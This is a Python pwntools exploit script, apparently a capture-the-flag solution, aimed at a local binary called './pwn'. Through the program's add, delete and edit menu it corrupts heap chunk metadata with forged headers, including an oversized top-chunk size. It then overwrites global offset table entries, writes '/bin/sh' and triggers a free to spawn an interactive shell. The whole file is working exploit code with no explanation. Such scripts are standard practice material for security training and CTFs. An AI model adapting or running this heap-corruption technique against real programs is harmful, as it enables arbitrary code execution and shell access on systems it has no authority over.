from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b''

def add(size, con):
	sl(b'1')
	sl(byte(size))
	sd(con)

def dele(idx):
	sl(b'2')
	sl(byte(idx))

def edit(idx, con1, con2):
	sl(b'3')
	sl(byte(idx))
	sd(con1)
	sd(con2)

# 1->0x10 2->0x80 3->0xA00000 13337->0xFFFFFFFFFFFFFF70
add(3, b'0') # 0
dele(0)
add(3, b'1') # 1
dele(1)

add(1, b'2') # 2
add(2, b'3') # 3
dele(2)
payload = p64(0) + p64(0x11) + p64(0) + p64(0xfffffffffffffff1)
edit(2, b'\x30\x21\x60', payload)
dele(3)
payload = p64(0xffffffffffffff0) + p64(0x11) + p64(0) + p64(0xA00001)
edit(2, b'\x00', payload)
add(3, b'4') # 4
payload = p64(0xfffffffffffffff0) + p64(0x10) + p64(0) + p64(0xfffffffffffffff1)
edit(2, b'\x30\x21\x60', payload)
add(13337, b'5') # 5
add(1, b'6') # 6
edit(6, b'\x18\x20\x60\x00\x00\x00', b'\x00')
edit(0, b'\x6c\x09\x40\x00\x00\x00', b'\x00')
edit(6, b'/bin/sh', b'/bin/sh\x00')
#debug()
dele(6)
sh()
